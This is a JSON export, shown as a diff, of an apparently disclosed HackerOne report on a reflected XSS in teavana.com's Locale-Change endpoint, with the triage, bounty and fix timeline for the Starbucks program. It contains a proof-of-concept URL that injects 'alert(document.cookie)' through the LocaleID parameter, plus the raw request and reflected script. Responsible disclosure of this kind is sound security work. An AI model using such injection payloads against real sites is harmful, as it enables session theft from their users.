@@ -1,0 +1,446 @@
+{
+    "id": 190798,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTA3OTg=",
+    "url": "https://hackerone.com/reports/190798",
+    "title": "Reflected XSS on teavana.com (Locale-Change)",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "medium",
+    "readable_substate": "Resolved",
+    "created_at": "2016-12-13T11:40:29.111Z",
+    "submitted_at": "2016-12-13T11:40:29.111Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "inhibitor181",
+        "url": "/inhibitor181",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": true,
+        "verified": true,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 1989,
+        "url": "https://hackerone.com/starbucks",
+        "handle": "starbucks",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Starbucks",
+            "twitter_handle": "Starbucks",
+            "website": "http://www.starbucks.com",
+            "about": "OUR MISSION WITH EVERY CUP, WITH EVERY CONVERSATION, WITH EVERY COMMUNITY– WE NURTURE THE LIMITLESS POSSIBILITIES OF HUMAN CONNECTION"
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2017-06-09T00:00:19.014Z",
+    "bug_reporter_agreed_on_going_public_at": "2017-05-15T19:37:19.857Z",
+    "team_member_agreed_on_going_public_at": "2017-06-09T00:00:18.959Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "SUMMARY\n----\nHello, the link at https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=en_CA (was identified by changing languages) is prone to reflected XSS in the \"en\" zone of the LocaleID parameter. One can inject javascript that will be reflected back to the target while calling the modified link. \n\nPOC\n-----\nhttps://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(document.cookie);//an_CA\n\nThis injection is possible because the contents before the _CA are not validated and it will be injected in the response.\n\nRequest :\n\n```\nGET /on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(1);//dasdsan_CA HTTP/1.1\nHost: www.teavana.com\n```\n\nResponse :\n\n```\n<script type=\"text/javascript\">\nvar uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';\nuri=decodeURIComponent(uri);\nif(uri.indexOf(\"/ca/en\") >=0){\n  uri=uri.replace(\"/ca/en\",\"\");\n}\nelse if(uri.indexOf(\"/ca/fr\") >=0){\n  uri=uri.replace(\"/ca/fr\",\"\");\n}\nwindow.location = uri;\n</script>\n```\n\nNote the : var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';\n\nThis can also be modified to easily make an open redirect.\n\nAlso attached screenshot.",
+    "weakness": {
+        "id": 60,
+        "name": "Cross-site Scripting (XSS) - Generic"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 143168,
+            "file_name": "xss_tea.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/143/168/4b4f78b28977c6b328a176aba00b35f253138aa4/xss_tea.png?response-content-disposition=attachment%3B%20filename%3D%22xss_tea.png%22%3B%20filename%2A%3DUTF-8%27%27xss_tea.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T080354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=51681206d4cb3810bcaebb14b73009864e71c166c722eab9bfcd6f323bf1d32f",
+            "file_size": 109401,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": "2017-06-14T19:37:19.916Z",
+    "allow_singular_disclosure_after": -195827194.11081418,
+    "singular_disclosure_allowed": true,
+    "vote_count": 15,
+    "voters": [
+        "apapedulimu",
+        "gamliel",
+        "eveeez",
+        "exception",
+        "darwinks",
+        "zerotoone",
+        "japz",
+        "sumit7",
+        "scraps",
+        "sh3r1",
+        "and 5 more..."
+    ],
+    "severity": {
+        "rating": "medium",
+        "author_type": "Team"
+    },
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 1363384,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @inhibitor181 \n\nThank you for your submission. We are currently investigating this issue  and we'll let you know shortly.",
+            "automated_response": false,
+            "created_at": "2016-12-14T03:56:03.033Z",
+            "updated_at": "2016-12-14T03:56:03.033Z",
+            "actor": {
+                "username": "sharpie",
+                "cleared": false,
+                "verified": false,
+                "url": "/sharpie",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1376735,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@sharpie : Just a quick notification\n\nBefore you call the XSS link from the POC, you must access teava.com at least once normally (like a targeted user would have). After you access the site at least one time, calling the XSS link will call the javascript.\n\nIf you call the XSS link directly without having accessed the website at least once, nothing will happend (or you can call the xss link 2 times and the second time the javascript will be triggered).",
+            "automated_response": false,
+            "created_at": "2016-12-20T13:47:26.975Z",
+            "updated_at": "2016-12-20T13:47:26.975Z",
+            "actor": {
+                "username": "inhibitor181",
+                "cleared": true,
+                "verified": true,
+                "url": "/inhibitor181",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1390894,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Hi @inhibitor181,\n\nThanks for your patience on this item.  It initially appeared to be a duplicate of an issue that was resolved so it took us a little longer to triage this one. \n\nThe teavana.com team will be working on a fix and we'll be in touch as soon as it's resolved and time to re-test.\n\n",
+            "automated_response": false,
+            "created_at": "2016-12-29T18:22:24.066Z",
+            "updated_at": "2016-12-29T18:22:24.066Z",
+            "actor": {
+                "username": "siren",
+                "cleared": false,
+                "verified": false,
+                "url": "/siren",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1390896,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-12-29T18:22:36.486Z",
+            "updated_at": "2016-12-29T18:22:36.486Z",
+            "actor": {
+                "url": "/starbucks",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Starbucks"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "starbucks",
+            "collaborator": {
+                "username": "inhibitor181",
+                "url": "/inhibitor181"
+            }
+        },
+        {
+            "id": 1390955,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@siren Hi, no worries and thanks for the bounty! Once the issue is marked as resolved, I will also take a look again.",
+            "automated_response": false,
+            "created_at": "2016-12-29T18:40:28.490Z",
+            "updated_at": "2016-12-29T18:40:28.490Z",
+            "actor": {
+                "username": "inhibitor181",
+                "cleared": true,
+                "verified": true,
+                "url": "/inhibitor181",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1391852,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportTitleUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2016-12-30T06:59:53.245Z",
+            "updated_at": "2016-12-30T06:59:53.245Z",
+            "additional_data": {
+                "old_title": "Reflected XSS on teavana.com",
+                "new_title": "Reflected XSS on teavana.com (Locale-Change)"
+            },
+            "actor": {
+                "username": "sharpie",
+                "cleared": false,
+                "verified": false,
+                "url": "/sharpie",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1426291,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-01-17T23:57:01.833Z",
+            "updated_at": "2017-01-17T23:57:01.833Z",
+            "additional_data": {
+                "old_severity": null,
+                "new_severity": "Medium",
+                "old_severity_id": null,
+                "new_severity_id": 20092
+            },
+            "actor": {
+                "username": "coldbr3w",
+                "cleared": false,
+                "verified": false,
+                "url": "/coldbr3w",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1529360,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Hey @inhibitor181,\n\nThis one should now be resolved.  Can you re-test & confirm?",
+            "automated_response": false,
+            "created_at": "2017-03-09T07:26:48.021Z",
+            "updated_at": "2017-03-09T07:26:48.021Z",
+            "actor": {
+                "username": "siren",
+                "cleared": false,
+                "verified": false,
+                "url": "/siren",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "inhibitor181",
+                "url": "/inhibitor181"
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1529374,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @siren. Confirm as fixed, the server doesn't answer with content anymore.",
+            "automated_response": false,
+            "created_at": "2017-03-09T07:34:19.232Z",
+            "updated_at": "2017-03-09T07:34:19.232Z",
+            "actor": {
+                "username": "inhibitor181",
+                "cleared": true,
+                "verified": true,
+                "url": "/inhibitor181",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1529377,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Excellent - thanks for the quick confirm, @inhibitor181!",
+            "automated_response": false,
+            "created_at": "2017-03-09T07:35:29.574Z",
+            "updated_at": "2017-03-09T07:35:29.574Z",
+            "actor": {
+                "username": "siren",
+                "cleared": false,
+                "verified": false,
+                "url": "/siren",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1675489,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Public disclosure ?",
+            "automated_response": false,
+            "created_at": "2017-05-15T19:37:19.877Z",
+            "updated_at": "2017-05-15T19:37:19.877Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "inhibitor181",
+                "cleared": true,
+                "verified": true,
+                "url": "/inhibitor181",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iK9ytFYT28QM6G5xrCaphqnv/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1743192,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-06-09T00:00:18.982Z",
+            "updated_at": "2017-06-09T00:00:18.982Z",
+            "actor": {
+                "username": "coldbr3w",
+                "cleared": false,
+                "verified": false,
+                "url": "/coldbr3w",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        },
+        {
+            "id": 1743193,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2017-06-09T00:00:19.027Z",
+            "updated_at": "2017-06-09T00:00:19.027Z",
+            "actor": {
+                "username": "coldbr3w",
+                "cleared": false,
+                "verified": false,
+                "url": "/coldbr3w",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/109/209/dd6ef3a28f555d97d4d9c90c41c908d9b11daf47_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "starbucks"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
